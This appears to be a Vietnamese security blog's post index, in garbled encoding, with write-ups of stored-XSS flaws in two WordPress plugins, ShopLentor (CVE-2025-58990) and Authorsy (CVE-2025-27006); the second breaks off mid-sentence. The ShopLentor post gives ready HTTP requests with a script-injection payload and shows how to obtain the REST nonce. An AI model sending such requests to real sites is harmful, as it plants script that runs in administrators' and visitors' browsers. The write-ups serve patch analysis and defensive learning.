[{"content":"L·ªó h·ªïng trong plugin ShopLentor tr∆∞·ªõc phi√™n b·∫£n 3.2.0 cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn contributor ch√®n m√£ ƒë·ªôc v√†o CSS c·ªßa block. CSS n√†y sau ƒë√≥ ƒë∆∞·ª£c n·∫°p inline v√†o trang v√† c√≥ kh·∫£ nƒÉng d·∫´n t·ªõi Stored XSS khi ƒë∆∞·ª£c preview ho·∫∑c hi·ªÉn th·ªã trong tr√¨nh duy·ªát.\nCVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 3.2.0 CVSS Severity: Low (6.5) Required Privilege: Contributor Requirements Local WordPress and Debugging ShopLentor: v3.2.0(vul) v√† v3.2.1(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i ShopLentor Plugin Analysis Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file woolentor-blocks/includes/classes/Manage_Styles.php.\nB·∫£n l·ªói:\npublic function save_block_css( $request ){ $params = $request-\u0026gt;get_params(); $post_id = sanitize_text_field( $params[\u0026#39;post_id\u0026#39;] ); // Kh√¥ng ki·ªÉm tra quy·ªÅn user // Kh√¥ng l·ªçc n·ªôi dung CSS tr∆∞·ªõc khi l∆∞u update_post_meta( $post_id, \u0026#39;_woolentor_css\u0026#39;, $params[\u0026#39;block_css\u0026#39;] ); $wp_filesystem-\u0026gt;put_contents( $dirname . $filename, $params[\u0026#39;block_css\u0026#39;] ); } B·∫£n v√°:\npublic function save_block_css( $request ){ $params = $request-\u0026gt;get_params(); $post_id = sanitize_text_field( $params[\u0026#39;post_id\u0026#39;] ); // Ch·ªâ admin ho·∫∑c t√°c gi·∫£ b√†i vi·∫øt m·ªõi ƒë∆∞·ª£c ph√©p $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can(\u0026#39;manage_options\u0026#39;) \u0026amp;\u0026amp; get_current_user_id() !== (int) $post-\u0026gt;post_author ) ) { return [\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; __(\u0026#39;No permission\u0026#39;)]; } // L·ªçc d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u $block_css = $this-\u0026gt;sanitize_css_content( $params[\u0026#39;block_css\u0026#39;] ); update_post_meta( $post_id, \u0026#39;_woolentor_css\u0026#39;, $block_css ); $wp_filesystem-\u0026gt;put_contents( $dirname . $filename, $block_css ); } B·∫£n v√° d√πng current_user_can(manage_options) ƒë·ªÉ ki·ªÉm tra c√≥ ph·∫£i admin kh√¥ng\nN·∫øu user l√† admin =\u0026gt; v·∫ø ƒë·∫ßu ! current_user_can('manage_options') = false =\u0026gt; c·∫£ bi·ªÉu th·ª©c \u0026amp;\u0026amp; = false =\u0026gt; qua ƒë∆∞·ª£c. N·∫øu user l√† author =\u0026gt; v·∫ø sau get_current_user_id() !== (int) $post-\u0026gt;post_author = false =\u0026gt; c·∫£ bi·ªÉu th·ª©c \u0026amp;\u0026amp; = false =\u0026gt; qua ƒë∆∞·ª£c. How It Work? public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists(\u0026#39;WP_Filesystem\u0026#39;) ) { require_once( ABSPATH . \u0026#39;wp-admin/includes/file.php\u0026#39; ); } $params = $request-\u0026gt;get_params(); $post_id = sanitize_text_field( $params[\u0026#39;post_id\u0026#39;] ); if ( $post_id == \u0026#39;woolentor-widget\u0026#39; \u0026amp;\u0026amp; $params[\u0026#39;has_block\u0026#39;] ) { update_option( $post_id, $params[\u0026#39;block_css\u0026#39;] ); return [ \u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;message\u0026#39; =\u0026gt; __(\u0026#39;Widget CSS Saved.\u0026#39;, \u0026#39;woolentor\u0026#39;) ]; } $filename = \u0026#34;woolentor-css-{$post_id}.css\u0026#34;; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url[\u0026#39;basedir\u0026#39;] ) . \u0026#39;woolentor-addons/\u0026#39;; if ( $params[\u0026#39;has_block\u0026#39;] ) { update_post_meta( $post_id, \u0026#39;_woolentor_active\u0026#39;, \u0026#39;yes\u0026#39; ); $all_block_css = $params[\u0026#39;block_css\u0026#39;]; WP_Filesystem( false, $upload_dir_url[\u0026#39;basedir\u0026#39;], true ); if( ! $wp_filesystem-\u0026gt;is_dir( $dirname ) ) { $wp_filesystem-\u0026gt;mkdir( $dirname ); } update_post_meta( $post_id, \u0026#39;_woolentor_css\u0026#39;, $all_block_css ); if ( ! $wp_filesystem-\u0026gt;put_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __(\u0026#39;You are not permitted to save CSS.\u0026#39;, \u0026#39;woolentor\u0026#39; ) ); } return [ \u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;message\u0026#39; =\u0026gt;__(\u0026#39;WooLentor Blocks css file update.\u0026#39;, \u0026#39;woolentor\u0026#39; ) ]; } else { delete_post_meta( $post_id, \u0026#39;_woolentor_active\u0026#39; ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, \u0026#39;_woolentor_css\u0026#39; ); return [ \u0026#39;success\u0026#39; =\u0026gt; true, \u0026#39;message\u0026#39; =\u0026gt; __(\u0026#39;WooLentor Blocks CSS Delete.\u0026#39;, \u0026#39;woolentor\u0026#39; ) ]; } } catch( \\Exception $e ){ return [ \u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; $e-\u0026gt;getMessage() ]; } } H√†m save_block_css() thu·ªôc class Manage_Styles c√≥ nhi·ªám v·ª• l∆∞u ho·∫∑c x√≥a CSS tu·ª≥ theo block.\n·ª®ng d·ª•ng s·∫Ω l·∫•y post_id v√† n·ªôi dung block_css t·ª´ request.\nTr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát: n·∫øu post_id = woolentor-widget =\u0026gt; l∆∞u CSS v√†o wp_options\nTr∆∞·ªùng h·ª£p b√†i vi·∫øt th∆∞·ªùng:\nN·∫øu c√≥ block (has_block = true):\nƒê√°nh d·∫•u post ƒëang active (_woolentor_active). L∆∞u CSS v√†o b·∫£ng wp_postmeta v·ªõi meta_key l√† _woolentor_css. mysql\u0026gt; select * from wp_postmeta where meta_key=\u0026#39;_woolentor_css\u0026#39;; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Ghi CSS ra file trong th∆∞ m·ª•c upload (woolentor-css-{post_id}.css). N·∫øu kh√¥ng c√≥ block (has_block = false):\nXo√° tr·∫°ng th√°i active v√† CSS meta. Xo√° file CSS n·∫øu t·ªìn t·∫°i. üëâ Kh·∫£ nƒÉng x·∫£y ra l√† combo Stored XSS ph·ªï bi·∫øn trong plugin WordPress: user role contributor (kh√¥ng c√≥ quy·ªÅn publish) t·∫°o post c√≥ CSS ch·ª©a payload XSS. Payload n√†y ƒë∆∞·ª£c l∆∞u trong database ho·∫∑c m·ªôt file; Ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn cao h∆°n s·∫Ω preview (xem tr∆∞·ªõc) n·ªôi dung tr∆∞·ªõc khi publish, payload s·∫Ω ƒë∆∞·ª£c t·∫£i/hi·ªÉn th·ªã trong tr√¨nh duy·ªát v√† th·ª±c thi, g√¢y ra XSS.\nƒê·ªÉ hi·ªÉu c√°ch d·ªØ li·ªáu ƒë∆∞·ª£c hi·ªÉn th·ªã, ta t√¨m v·ªõi t·ª´ kh√≥a _woolentor_css trong th∆∞ m·ª•c plugin. V√¨ CSS ƒë∆∞·ª£c l∆∞u trong wp_postmeta v·ªõi meta_key = _woolentor_css, n√™n ch·∫Øc ch·∫Øn plugin s·∫Ω truy v·∫•n gi√° tr·ªã n√†y v√† ch√®n tr·ª±c ti·∫øp v√†o HTML.\ngenerate_inline_css() l·∫•y block CSS t·ª´ wp_postmeta v·ªõi meta_key = _woolentor_css v√† l·∫•y t·ª´ file woolentor-css-{$post_id}.css, n·∫øu file t·ªìn t·∫°i th√¨ get_contents v√† inline CSS cho post c√≥ $post_id ƒë∆∞·ª£c truy·ªÅn v√†o, c√≤n n·∫øu file kh√¥ng t·ªìn t·∫°i th√¨ l·∫•y t·ª´ wp_postmeta.\nN·ªôi dung ƒë∆∞·ª£c ƒë·∫∑t trong th·∫ª \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt;\u0026lt;/style\u0026gt;\nclass Manage_Styles ƒëƒÉng k√Ω REST API trong h√†m register_routes\npublic function register_routes( $namespace ){ register_rest_route( $namespace, \u0026#39;save_css\u0026#39;, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \u0026#39;POST\u0026#39;, \u0026#39;callback\u0026#39; =\u0026gt; [ $this, \u0026#39;save_block_css\u0026#39; ], \u0026#39;permission_callback\u0026#39; =\u0026gt; [ $this, \u0026#39;permission_check\u0026#39; ], \u0026#39;args\u0026#39; =\u0026gt; [] ] ] ); // other route } H√†m register_rest_route() t·∫°o m·ªôt REST API endpoint t·∫°i ƒë∆∞·ªùng d·∫´n:\n/wp-json/{namespace}/save_css Khi c√≥ request POST t·ªõi endpoint n√†y:\nWordPress s·∫Ω g·ªçi h√†m save_block_css() ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu. Tr∆∞·ªõc ƒë√≥, permission_callback s·∫Ω ch·∫°y h√†m permission_check() ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user (n·∫øu tr·∫£ v·ªÅ false th√¨ ch·∫∑n request). public function permission_check() { if( current_user_can( \u0026#39;edit_posts\u0026#39; ) ){ return true; }else{ return false; } } H√†m permission_check quy ƒë·ªãnh r·∫±ng ch·ªâ nh·ªØng user c√≥ quy·ªÅn contributor tr·ªü l√™n m·ªõi ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng API n√†y.\nTa ch∆∞a x√°c ƒë·ªãnh ƒë∆∞·ª£c ch√≠nh x√°c namespace ·ªü ƒë√¢y l√† g√¨ v√¨ n√≥ ƒë∆∞·ª£c khai b√°o ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn, kh√¥ng ph·∫£i trong class n√†y. Ta t·∫≠n d·ª•ng route save_css ƒë·ªÉ truy v·∫øt.\nTruy c·∫≠p /wp-json/ v√† t√¨m v·ªõi t·ª´ kh√≥a save_css\nK·∫øt qu·∫£ cho th·∫•y endpoint th·ª±c t·∫ø l√†:\nhttp://localhost/wp-json/woolentor/v1/save_css ƒê·ªÉ bi·∫øt namespace n√†y ƒë∆∞·ª£c khai b√°o ·ªü ƒë√¢u, ta ti·∫øp t·ª•c t√¨m trong m√£ ngu·ªìn v·ªõi t·ª´ kh√≥a 'woolentor/v1':\nC√≥ nhi·ªÅu k·∫øt qu·∫£, nh∆∞ng v√¨ ta ƒëang ph√¢n t√≠ch t√≠nh nƒÉng REST API, n√™n t·∫≠p trung v√†o file Api.php.\nregister_routes( $namespace ) thu·ªôc class Manage_Styles y√™u c·∫ßu tham s·ªë $namespace n√™n c√≥ th·ªÉ woolentor/v1 ƒë∆∞·ª£c truy·ªÅn ·ªü ƒë√¢y th√¥ng qua th·ªÉ hi·ªán c·ªßa class g·ªçi ƒë·∫øn h√†m. ta t√¨m v·ªõi t·ª´ kh√≥a Manage_Styles trong file Api.php ƒë·ªÉ bi·∫øt n√≥ ƒë∆∞·ª£c g·ªçi nh∆∞ v·∫≠y kh√¥ng.\nnamespace ch√≠nh x√°c ƒë∆∞·ª£c g·ªçi v√† truy·ªÅn nh∆∞ v·∫≠y.\nüëâ Nh∆∞ v·∫≠y, khi g·ª≠i POST request ƒë·∫øn endpoint http://localhost/wp-json/woolentor/v1/save_css, callback save_block_css ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m/s·ª≠a block CSS trong file v√† database. Khi truy c·∫≠p v√†o post c√≥ post_id li√™n quan ƒë·∫øn block CSS ƒë∆∞·ª£c l∆∞u, generate_inline_css s·∫Ω l·∫•y n·ªôi block CSS v√† inline CSS trong th·∫ª \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt;\u0026lt;/style\u0026gt; c·ªßa post.\nExploit Detect XSS S·ª≠ d·ª•ng user c√≥ role contributor t·∫°o 1 post b·∫•t k√¨, ghi nh·ªõ id c·ªßa post ƒë√≥.\nG·ª≠i POST request ƒë·∫øn endpoint http://localhost/wp-json/woolentor/v1/save_css v·ªõi XSS payload\nPOST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \u0026#34;post_id\u0026#34;:1416, \u0026#34;has_block\u0026#34;:true, \u0026#34;block_css\u0026#34;:\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026#34; } Response\n{ \u0026#34;code\u0026#34;:\u0026#34;rest_forbidden\u0026#34;, \u0026#34;message\u0026#34;:\u0026#34;Sorry, you are not allowed to do that.\u0026#34;, \u0026#34;data\u0026#34;:{ \u0026#34;status\u0026#34;:401 } } üëâ Thi·∫øu header X-WP-Nonce ƒë·ªÉ ph√¢n quy·ªÅn ng∆∞·ªùi d√πng. Ta m·ªü source HTML (Ctrl+U) trang ch·ªânh s·ª≠a b√†i vi·∫øt:\nview-source:http://localhost/wp-admin/post.php?post=\u0026lt;post_id\u0026gt;\u0026amp;action=edit T√¨m wpApiSettings trong source v√† l·∫•y gi√° tr·ªã nonce\nG·ª≠i request v·ªõi X-WP-Nonce c√≥ gi√° tr·ªã v·ª´a l·∫•y ƒë∆∞·ª£c\nPOST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \u0026#34;post_id\u0026#34;:1416, \u0026#34;has_block\u0026#34;:true, \u0026#34;block_css\u0026#34;:\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026#34; } Preview post\nüëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o\nView source code\nConclusion L·ªó h·ªïng CVE-2025-58990 trong plugin ShopLentor \u0026lt;= 3.2.0 cho ph√©p contributor ch√®n CSS ƒë·ªôc h·∫°i d·∫´n ƒë·∫øn Stored XSS khi admin/author preview ho·∫∑c xem post. B·∫£n v√° 3.2.1 b·ªï sung ki·ªÉm tra quy·ªÅn v√† sanitize CSS, ngƒÉn ch·∫∑n khai th√°c.\nKey takeaways:\nLu√¥n k·∫øt h·ª£p ki·ªÉm tra quy·ªÅn v√† sanitize d·ªØ li·ªáu khi x·ª≠ l√Ω input t·ª´ ng∆∞·ªùi d√πng. C√°c role th·∫•p (nh∆∞ contributor) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu API kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch. Stored XSS trong WordPress th∆∞·ªùng xu·∫•t hi·ªán khi d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u DB/file =\u0026gt; render inline m√† kh√¥ng l·ªçc. Vi·ªác c·∫≠p nh·∫≠t plugin k·ªãp th·ªùi l√† bi·ªán ph√°p ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t. References Cross-site scripting (XSS) cheat sheet\nWordPress ShopLentor Plugin \u0026lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","permalink":"//localhost:1313/vi/posts/2025-09-17-cve-2025-58990/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eShopLentor\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.2.0\u003c/strong\u003e cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn \u003cstrong\u003econtributor\u003c/strong\u003e ch√®n m√£ ƒë·ªôc v√†o CSS c·ªßa block. CSS n√†y sau ƒë√≥ ƒë∆∞·ª£c n·∫°p inline v√†o trang v√† c√≥ kh·∫£ nƒÉng d·∫´n t·ªõi Stored XSS khi ƒë∆∞·ª£c preview ho·∫∑c hi·ªÉn th·ªã trong tr√¨nh duy·ªát.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58990\"\u003eCVE-2025-58990\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/woolentor-addons/\"\u003eWordPress ShopLentor Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2.0\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: Low (6.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Contributor\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eShopLentor\u003c/strong\u003e: v3.2.0(vul) v√† v3.2.1(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eShopLentor Plugin\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003ch3 id=\"patch-diff\"\u003ePatch Diff\u003c/h3\u003e\n\u003cp\u003eD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.\nC√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file \u003cstrong\u003ewoolentor-blocks/includes/classes/Manage_Styles.php\u003c/strong\u003e.\u003c/p\u003e","title":"CVE-2025-58990 Analysis \u0026 POC"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Authorsy c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.0.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Subscriber nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c Unauthenticated. {: .prompt-info }\nRequirements Local WordPress and Debugging Authorsy: v1.0.5(vul) v√† v1.0.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong wp_options v√† ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn nguy c∆° Broken Access Control v√† c√≥ th·ªÉ XSS n·∫øu ch√®n payload ƒë·ªôc h·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file core/settings/api-settings.php v√† core/enqueue-inline/enqueue-inline.php\nFile core/enqueue-inline/enqueue-inline.php\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } D·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi th√™m v√†o HTML kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t, kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =\u0026gt; d·ªÖ b·ªã XSS.\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single() \u0026amp;\u0026amp; !empty($ea_custom_css)){ // Additional sanitization for output to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } B·∫£n v√° b·∫£o v·ªá d·ªØ li·ªáu b·∫±ng sanitize + escape, ƒë·ªìng th·ªùi ki·ªÉm tra CSS c√≥ t·ªìn t·∫°i tr∆∞·ªõc khi ch√®n.\nFile core/settings/api-settings.php\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } ·ª®ng d·ª•ng ƒëƒÉng k√Ω REST API b·∫±ng register_rest_route nh∆∞ng kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p (permission_callback lu√¥n true) =\u0026gt; Ai c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng API n√†y.\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } permission callback ƒë∆∞·ª£c v√°, ch·ªâ admin qu·∫£n l√Ω ƒë∆∞·ª£c settings, b·∫£o v·ªá ch·ªëng Broken Access Control v√† gi√°n ti·∫øp gi·∫£m nguy c∆° XSS.\nHow it work? class Enqueue_Inline { public function init() { add_action(\u0026#39;wp_head\u0026#39;, array($this, \u0026#39;custom_inline_css\u0026#39;)); } // other logic public function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $primary_color = authorsy_get_option(\u0026#39;primary_color\u0026#39;); $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } } custom_inline_css ƒë∆∞·ª£c d√πng l√†m callback cho hook wp_head. Nghƒ©a l√† khi WP render ph·∫ßn \u0026lt;head\u0026gt; c·ªßa trang (ngay tr∆∞·ªõc \u0026lt;/head\u0026gt;), WP s·∫Ω ch·∫°y custom_inline_css() ƒë·ªÉ th√™m CSS.\nTrong custom_inline_css chu·ªói $custom_css ƒë∆∞·ª£c t·∫°o, d√πng ƒë·ªÉ ch·ª©a:\nN·ªôi dung c√°c bi·∫øn c·∫•u h√¨nh l·∫•y t·ª´ authorsy_get_option() v√† m·ªôt s·ªë logic kh√°c. Ch√∫ng ƒë∆∞·ª£c n·ªëi, th√™m v√†o $custom_css tr∆∞·ªõc khi wp_add_inline_style() ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m v√†o \u0026lt;head\u0026gt;. function authorsy_get_option( $key = \u0026#39;\u0026#39;, $default = false ) { $options = get_option( \u0026#39;authorsy_settings\u0026#39; ); $value = $default; if ( isset( $options[$key] ) ) { $value = ! empty( $options[$key] ) ? $options[$key] : $default; } return $value; } authorsy_get_option l·∫•y m·∫£ng t·∫•t c·∫£ c√°c option c·ªßa plugin Authorsy ƒë∆∞·ª£c l∆∞u trong b·∫£ng wp_options b·∫±ng get_option('authorsy_settings').\nSau ƒë√≥ ki·ªÉm tra xem key c√≥ t·ªìn t·∫°i trong m·∫£ng options kh√¥ng. N·∫øu gi√° tr·ªã kh√¥ng r·ªóng, g√°n v√†o $value, n·∫øu r·ªóng th√¨ gi·ªØ default.\nüëâ V√¨ d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u tr·ªØ r·ªìi m·ªõi render ra HTML n·∫øn ƒë√¢y l√† Stored XSS\nKhi truy c·∫≠p /wp-json/authorsy/v1/settings v·ªõi method POST =\u0026gt; update_settings ƒë∆∞·ª£c g·ªçi kh√¥ng y√™u c·∫ßu ƒë·∫∑c quy·ªÅn.\npublic function update_settings( $request ) { $options = json_decode( $request-\u0026gt;get_body(), true ); $this-\u0026gt;verify_nonce( $request ); $data = [ \u0026#39;status_code\u0026#39; =\u0026gt; 200, \u0026#39;success\u0026#39; =\u0026gt; 1, \u0026#39;message\u0026#39; =\u0026gt; esc_html__( \u0026#39;Settings successfully updated\u0026#39;, \u0026#39;authorsy\u0026#39; ), \u0026#39;data\u0026#39; =\u0026gt; authorsy_get_settings(), ]; if ( $options ) { foreach ( $options as $key =\u0026gt; $value ) { authorsy_update_option( $key, $value ); } } $data[\u0026#39;data\u0026#39;] = authorsy_get_settings(); return rest_ensure_response( $data ); } H√†m update_settings nh·∫≠n d·ªØ li·ªáu JSON t·ª´ request, decode th√†nh c√°c c·∫∑p key-value v√† c·∫≠p nh·∫≠t ch√∫ng v√†o c∆° s·ªü d·ªØ li·ªáu. Tr∆∞·ªõc khi th·ª±c hi·ªán update, ·ª©ng d·ª•ng g·ªçi $this-\u0026gt;verify_nonce( $request ); ƒë·ªÉ ki·ªÉm tra nonce.\npublic static function verify_nonce($request) { $nonce = $request-\u0026gt;get_header(\u0026#39;X-WP-Nonce\u0026#39;); if (!wp_verify_nonce($nonce, \u0026#39;wp_rest\u0026#39;)) { return new \\WP_Error(\u0026#39;invalid_nonce\u0026#39;, __(\u0026#39;Invalid nonce.\u0026#39;, \u0026#39;authorsy\u0026#39;), [\u0026#39;status\u0026#39; =\u0026gt; 403]); } return true; } ƒêi·ªÉm quan tr·ªçng:\nKhi nonce kh√¥ng h·ª£p l·ªá, h√†m ch·ªâ tr·∫£ v·ªÅ m·ªôt 